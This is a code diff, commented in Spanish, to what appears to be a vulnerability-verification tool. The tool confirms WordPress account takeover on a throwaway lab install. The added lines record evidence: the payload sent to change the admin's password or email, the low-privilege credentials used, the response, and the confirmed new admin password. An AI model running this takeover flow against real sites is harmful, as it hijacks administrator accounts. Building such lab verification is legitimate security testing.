@@ -62,6 +62,13 @@ class WpVerifyResult:
     detail: str = ""
     logs: List[str] = field(default_factory=list)
     limitations: List[str] = field(default_factory=list)
+    # evidencia REAL y concreta de la ejecucion contra el laboratorio efimero (no plantilla, no
+    # placeholders): el payload exacto enviado, el admin_id real del laboratorio, el codigo de
+    # respuesta real, y la password/email reales que el ataque fijo y que el segundo login
+    # confirmo que funcionaban. Son datos de un WordPress desechable que ya no existe cuando el
+    # analista los lee -- no filtran nada de ningun objetivo real, y sirven como prueba dura de que
+    # el flujo se ejecuto de verdad, no que se simulo.
+    evidence: dict = field(default_factory=dict)
 
 
 def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
@@ -398,12 +405,22 @@ def verify_wordpress_account_takeover(
         if pass_param:
             payload[pass_param] = new_pass
         m = (http_method or "POST").upper()
+        # evidencia REAL: el payload exacto que se envio de verdad (datos de un laboratorio
+        # desechable, no de un objetivo real -- seguro de mostrar tal cual).
+        res.evidence.update({
+            "login_bajo_privilegio": sub_user, "login_bajo_privilegio_password": sub_pass,
+            "admin_user": admin_user, "admin_id": admin_id,
+            "id_param": id_param, "email_param": email_param or None, "pass_param": pass_param or None,
+            "metodo": m, "endpoint": endpoint, "payload_enviado": dict(payload),
+        })
         step(f"enviando la peticion {m} {endpoint} dirigida al admin (id={admin_id})...")
         try:
             resp = sess.request(m, base_url + endpoint,
                                data=payload if m != "GET" else None,
                                params=payload if m == "GET" else None, timeout=20)
             res.logs.append(f"peticion enviada: {resp.status_code}")
+            res.evidence["status_code_respuesta"] = resp.status_code
+            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:300]
         except Exception as e:
             res.detail = f"fallo enviando la peticion: {e}"
             return res
@@ -415,6 +432,10 @@ def verify_wordpress_account_takeover(
             res.ok = True
             res.detail = (f"ACCOUNT TAKEOVER confirmado: login como '{admin_user}' con la password "
                           f"fijada por la peticion funciono de verdad (admin_id={admin_id})")
+            res.evidence["password_nueva_confirmada"] = new_pass
+            res.evidence["confirmacion"] = (f"login real como '{admin_user}' con la password "
+                                            f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
+                                            f"presente tras el POST a wp-login.php)")
             step("VERIFICADO: el login como admin con la password nueva funciono.")
             return res
 
@@ -423,6 +444,8 @@ def verify_wordpress_account_takeover(
             cur = lab.wp_cli("user", "get", admin_id, "--field=user_email", timeout=20).stdout.strip()
             res.ok = True
             res.verified = (cur == new_email)
+            res.evidence["email_nuevo_confirmado"] = new_email
+            res.evidence["email_leido_tras_ataque"] = cur
             res.detail = (f"email del admin tras la peticion: {cur!r} "
                           f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
             return res
